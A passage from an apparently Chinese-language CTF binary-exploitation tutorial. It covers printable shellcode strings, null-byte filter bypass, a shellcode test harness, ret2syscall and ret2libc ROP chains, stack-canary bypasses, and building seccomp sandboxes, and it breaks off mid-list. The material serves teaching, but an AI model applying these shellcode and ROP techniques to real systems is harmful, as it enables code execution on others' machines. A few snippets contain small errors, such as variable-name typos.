<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103S0g0x4L1L0R2n1n0W7K7o0Y7K0d2m4B0U380a050W</span><br></pre></td></tr></table></figure></div></li>
<li><p>64 位（271字节，rdi）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M7M1o1M170Y172y0h16110j100o0Z0J131k1217100Z110Y0i0Z0Y09110k0x2I100i0i020W130e0F0x0x0V0c0Z0u0A2n101k0t2K0h0i0t180y0D132F110M130y120c102n102q141N117K110a122k112H102O17031709102Z172q102q122L162L110e120S102u121N107o00</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="x00-截断"><code>\x00</code> 截断</h2>
<p>对于过滤 shellcode 的题目一般是采用 strlen 获取
shellcode长度，因此可以在shellcode前加一个以 <code>\x00</code>
开头的指令来绕过对 shellcode 的过滤。</p>
<p>64 位的指令如下，32 位的话寄存器会改下名，opcode 不变。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">40</span> <span class="number">00</span>                 add    BYTE PTR [rax+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">41</span> <span class="number">00</span>                 add    BYTE PTR [rcx+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">42</span> <span class="number">00</span>                 add    BYTE PTR [rdx+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">43</span> <span class="number">00</span>                 add    BYTE PTR [rbx+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">45</span> <span class="number">00</span>                 add    BYTE PTR [rbp+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">46</span> <span class="number">00</span>                 add    BYTE PTR [rsi+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">47</span> <span class="number">00</span>                 add    BYTE PTR [rdi+<span class="number">0x0</span>],  al</span><br></pre></td></tr></table></figure></div>
<h2 id="测试-shellcode">测试 shellcode</h2>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -zexecstack -g -m32 -o shellcode-test shellcode-test.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">char</span> shellcode[]=<span class="string">&quot;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA&quot;</span>;</span><br><span class="line">	<span class="built_in">void</span>(*run)()=(<span class="built_in">void</span>(*)())shellcode;</span><br><span class="line">	<span class="built_in">run</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="ret2syscall">ret2syscall</h1>
<p>构造rop链模拟系统调用过程</p>
<p><code>ROPgadget</code>有时可自动构造，但可能长度过长，建议手动构造。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget.py --binary ./pwn --ropchain</span><br></pre></td></tr></table></figure></div>
<p><code>ROPgadget</code>检索相关指令举例：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./pwn --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br></pre></td></tr></table></figure></div>
<p><code>ropper</code> 检索 gadget 举例：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file ./pwn --nocolor &gt; rop</span><br></pre></td></tr></table></figure></div>
<p>注意：</p>
<ul>
<li>rax/eax 寄存器通常用来存储返回值，因此可以通过控制返回值来控制
rax/eax 寄存器，不一定需要 gadget。例如 alarm 函数每次会返回上一次设置的
alarm 的剩余时间，特别的，第一次会返回 0。因此可以通过栈溢出反复调用
alarm 并控制交互时间来控制 eax 寄存器的值。</li>
<li>可以通过 ret2csu 来控制寄存器。</li>
<li>如果寄存器不好控制可以考虑 SROP 。</li>
<li>如果缺少 <code>syscall; ret;</code> 可以考虑将题目中的
<code>alarm@got</code> 中的内容通过 rop（例如
<code>add byte ptr [rdi], al; ret;</code>）加一个偏移，这样
<code>alarm@plt</code> 就可以当做 <code>syscall; ret;</code> 使用。</li>
</ul>
<h2 id="位">32位</h2>
<ul>
<li>eax = 0x0b</li>
<li>ebx指向<code>"/bin/sh"</code></li>
<li>ecx = 0x0</li>
<li>edx = 0x0</li>
</ul>
<p>rop示例： <img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0386c58178b9c5d125f63daaba1d0ab2.png"
                     
                     
alt="图片" 
                
                ></p>
<h2 id="位-1">64位</h2>
<ul>
<li>rax = 0x3b</li>
<li>rdi指向<code>"/bin/sh"</code></li>
<li>rsi = 0x0</li>
<li>rdx = 0x0</li>
</ul>
<p>rop示例： <img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/513d283d1e58ea87558b0a1c7be5f06a.png"
                     
                     
alt="图片" 
                
                ></p>
<h1 id="ret2libc">ret2libc</h1>
<h2 id="linux延迟绑定机制">linux延迟绑定机制</h2>
<p>动态链接每个函数需要两个东西：</p>
<ul>
<li><p>用来存放外部函数地址的数据段</p></li>
<li><p>用来获取数据段记录的外部函数地址的代码</p></li>
</ul>
<p>对应有两个表，一个用来存放外部的函数地址的数据表称为<strong>全局偏移表</strong>（<strong>GOT</strong>,
Global Offset
Table），那个存放额外代码的表称为<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure
Link Table）</p>
<figure>
<img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/71e04df6969db4f75dcf43f09246a92b.png"
                     
                      alt="图片" 
                
                >
<figcaption aria-hidden="true">图片</figcaption>
</figure>
<p>可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT
的地址，GOT 表指向的就是 glibc 中的地址。</p>
<p>在这里面想要通过 plt 表获取函数的地址，首先要保证 got
表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux
引入了延迟绑定机制：只有动态库函数在被调用时，才会地址解析和重定位工作。</p>
<p>举例：</p>
<p>第一次调用 <img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/5dfa1cfa3febe69de060b44636b1d515.png"
                     
                      
                
                >
之后再次调用</p>
<p><img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c1fdf7342f4974e396840a515fd5cafe.png"
                     
                      
                
                ></p>
<h2 id="利用过程">利用过程</h2>
<h3 id="泄露函数地址">泄露函数地址</h3>
<p>泄露libc函数地址的条件：程序中有输出函数，例如puts/printf/write</p>
<p>以<code>write(1,buf,20)</code>为例：</p>
<ul>
<li><p>32位</p>
<figure>
<img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/467d83f627ee475bff7982574983ebbb.png"
                     
                     
alt="image-20220201201536794" 
                
                >
<figcaption aria-hidden="true">image-20220201201536794</figcaption>
</figure></li>
<li><p>64位</p>
<p>需要控制三个参数，rdi，rsi，rdx</p>
<p>第三个参数代表输出的size，如果没有rdx的gadget可以暂时不管，输出多少无所谓。</p></li>
</ul>
<p><img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d0960c383618941fa65bf62b257c8f79.png"
                     
                      
                
                ></p>
<p>截取泄露的函数地址</p>
<ul>
<li><p>32位</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure></div></li>
<li><p>64位</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure></div></li>
<li><p>特别得，对于printf输出数字结果，不需要小端序转换，<code>[:-1]</code>是为了去掉最后的回车</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>### 获取libc基址</p>
<ul>
<li><p>LibcSearcher</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">system_addr = libc_base + obj.dump(<span class="string">&quot;system&quot;</span>)</span><br></pre></td></tr></table></figure></div></li>
<li><p>ELF</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.symbol[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">ayatem_addr = libc_base + libc.symbol[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>### 构造rop获取shell</p>
<p>system函数调用过程。</p>
<p>另外，可以<code>one_gadget</code>查找已知的libc中<code>exevce("/bin/sh")</code>语句的地址。</p>
<p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">one_gadget libc-2.23.so</span></span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf0274 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1117 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure></div></p>
<h1 id="canary-绕过">canary 绕过</h1>
<h2 id="泄露canary">泄露canary</h2>
<ul>
<li><p>利用栈溢出泄露canary canary 以 <code>\x00</code>
结尾，通过栈溢出覆盖 canary 最低字节，之后输出输入内容时会连带将 canary
一同输出。</p></li>
<li><p>利用格式化字符串漏洞泄露 canary。</p>
<p>由于 canary
存储在栈上，因此很容易就可以利用格式化字符串漏洞泄露。</p></li>
</ul>
<h2 id="逐字节爆破">逐字节爆破</h2>
<p>例如下面的程序：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">	<span class="type">pid_t</span> id = fork();</span><br><span class="line">	<span class="keyword">if</span>(id &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(id) &#123;</span><br><span class="line">		<span class="built_in">wait</span>(<span class="number">0</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">vuln</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于 <strong>fork 产生的子进程的 canary
与父进程相同</strong>，因此可以根据子进程是否打印报错信息来逐字节爆破
canary 。</p>
<h2 id="劫持-__stack_chk_failed-函数">劫持 __stack_chk_failed 函数</h2>
<p>canary 检测失败会调用 __stack_chk_failed
函数，可以通过比如格式化字符串漏洞修改 got 表中对应 __stack_chk_failed
的位置为后门函数的地址来实施攻击。</p>
<h2 id="利用-__stack_chk_failed-函数报错信息泄露数据">利用
__stack_chk_failed 函数报错信息泄露数据</h2>
<p>__stack_chk_failed 函数输出错误信息时会把 __libc_argv[0]
作为信息输出，也就是 main 函数参数的
argv[0]，这个参数保存在栈中，如果可以覆盖该参数，也就可以打印出需要泄露的信息。</p>
<h2 id="覆盖-canary-初始值">覆盖 canary 初始值</h2>
<p>linux 下 fs 寄存器指向当前栈的 TLS 结构，fs:0x28 指向的是 TLS
结构中的 stack_guard 值，如果可以覆盖位于 TLS 中的 canary
初始值就可以绕过 canary 保护。</p>
<ul>
<li>栈和 mmap 出的内存一般离 TLS 很近，可以通过溢出覆盖。</li>
<li>gdb下利用 <code>search -canary字节数 canary</code>
命令可以快速定位出 canary 的位置。</li>
</ul>
<p><a class="link" 
 target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/pwn_cc2c970b6ae5033b88ec97722344e326" >例题<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i></p>
<p>另外如果题目中申请的 chunk 大小限制不能很大，无法触发 mmap 且只能申请
1 次，那么就无法通过堆溢出修改 canary 。</p>
<p>但是像<a class="link" 
 target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/21st_century" >这道题<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>可以通过栈溢出伪造环境变量添加
<code>MALLOC_MMAP_THRESHOLD_=1</code> ，这样即使 malloc 很小的 chunk
也会触发 mmap 分配内存，因此同样可以覆盖 canary 。</p>
<h1 id="沙箱绕过">沙箱绕过</h1>
<p>这里的沙箱通常指的是 seccomp 。</p>
<h2 id="基本概念">基本概念</h2>
<p><code>PR_SET_SECCOMP</code> 是 Linux
内核提供的一种机制，用于限制进程可以执行的系统调用，从而增强系统的安全性。<code>PR_SET_SECCOMP</code>
机制可以通过使用 <code>prctl()</code> 系统调用来设置，具体来说，可以通过
<code>PR_SET_SECCOMP</code> 命令设置进程的 seccomp 过滤器，或通过
<code>PR_SET_NO_NEW_PRIVS</code> 命令设置进程的
<code>no_new_privs</code> 标志。</p>
<p>seccomp 过滤器可以通过编写 BPF（Berkeley Packet
Filter）程序来实现，BPF
程序可以过滤进程所发起的系统调用，只允许特定的系统调用通过，从而限制进程的行为。seccomp
过滤器只能在进程启动时设置，并且一旦设置，就不能修改，这样可以防止攻击者通过注入代码来修改过滤器。</p>
<p><code>PR_SET_NO_NEW_PRIVS</code>
标志可以用于禁止进程获取更高的权限，即使进程拥有特权级别的用户或进程权限。这可以防止进程通过提升权限来攻击系统，从而增强系统的安全性。</p>
<p><strong>一般使用 seccomp 有两种方法，一种是用 <code>prctl</code>
，另一种是用 <code>seccomp</code> 。</strong></p>
<h3 id="使用-prctl-创建-seccomp">使用 prctl 创建 seccomp</h3>
<p>我们可以借助工具 seccomp-tools 来编写沙箱规则。</p>
<p>首先编写沙箱规则，这里我们保存在文件 <code>rule</code> 中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">A = arch</span><br><span class="line">A == ARCH_X86_64 ? next : kill</span><br><span class="line">A = sys_number</span><br><span class="line">A &gt;= 0x40000000 ? kill : next</span><br><span class="line">A == execve ? kill : allow</span><br><span class="line">allow:</span><br><span class="line">return ALLOW</span><br><span class="line">kill:</span><br><span class="line">return KILL</span><br></pre></td></tr></table></figure></div>
<p>运行命令将沙箱规则转换为可被 <code>PR_SET_SECCOMP</code>
识别的规则。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜ seccomp-tools asm rule -a amd64 -f raw | seccomp-tools disasm - </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x02 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
<p>将生成的规则应用到 c 程序中，这里使用 <code>prctl</code>
系统调用来设置沙箱规则。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 定义过滤器规则</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">            &#123;<span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000004</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x15</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0xc000003e</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000000</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x35</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x40000000</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x15</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x0000003b</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7fff0000</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000000</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">            .len = (<span class="type">unsigned</span> <span class="type">short</span>) (<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">            .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置seccomp过滤器</span></span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] prctl error.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行系统调用</span></span><br><span class="line">    <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>编译后通过 <code>seccomp-tools dump</code> 命令可以看到程序中有了
seccomp 规则（<code>ptctl</code> 系统调用需要 root 权限因此需要加
sudo）。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜ sudo seccomp-tools dump ./test</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x02 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
<p>运行程序发现 <code>execve</code> 系统调用无法正常执行。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜ sudo ./test    </span><br><span class="line">[1]    40123 invalid system call  sudo ./test</span><br></pre></td></tr></table></figure></div>
<h3 id="使用-seccomp-创建-seccomp">使用 seccomp 创建 seccomp</h3>
<p>如果是使用 <code>seccomp</code> 系统调用添加规则，那么首先需要安装
<code>seccomp</code> 库的开发包：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libseccomp-dev</span><br></pre></td></tr></table></figure></div>
<p>前面的代码可以写作如下形式：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc test.c -o test -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个过滤器上下文</span></span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加过滤规则</span></span><br><span class="line">    seccomp_arch_add(ctx, SCMP_ARCH_X86_64);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行系统调用</span></span><br><span class="line">    <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中添加规则的函数 <code>seccomp_arch_add</code> 定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seccomp_rule_add</span><span class="params">(scmp_filter_ctx ctx, <span class="type">uint32_t</span> action, <span class="type">int</span> syscall, <span class="type">unsigned</span> <span class="type">int</span> arg_cnt, ...)</span>;</span><br></pre></td></tr></table></figure></div>
<p>其中参数解释如下：</p>
<ul>
<li><p><code>ctx</code>：过滤器上下文，用于存储过滤规则。</p></li>
<li><p><code>action</code>：当规则匹配时的操作，可以是以下值之一。</p>
<ul>
<li><code>SCMP_ACT_ALLOW</code>：允许系统调用。</li>
<li><code>SCMP_ACT_KILL</code>：杀死进程。</li>
<li><code>SCMP_ACT_ERRNO</code>：返回错误码并允许系统调用，用法为
<code>SCMP_ACT_ERRNO(返回值)</code>
，这样该系统调用如果满足条件则直接返回定义的返回值而不进行系统调用。在某些题目中通常用来劫持特定系统调用返回特殊值，比如劫持
<code>open</code> 系统调用返回 0 即标准输入。</li>
</ul></li>
<li><p><code>syscall</code>：要限制的系统调用号。</p></li>
<li><p><code>arg_cnt</code>：要匹配的参数数量，如果没有参数需要匹配，则
<code>arg_cnt</code> 应该为 0 。</p></li>
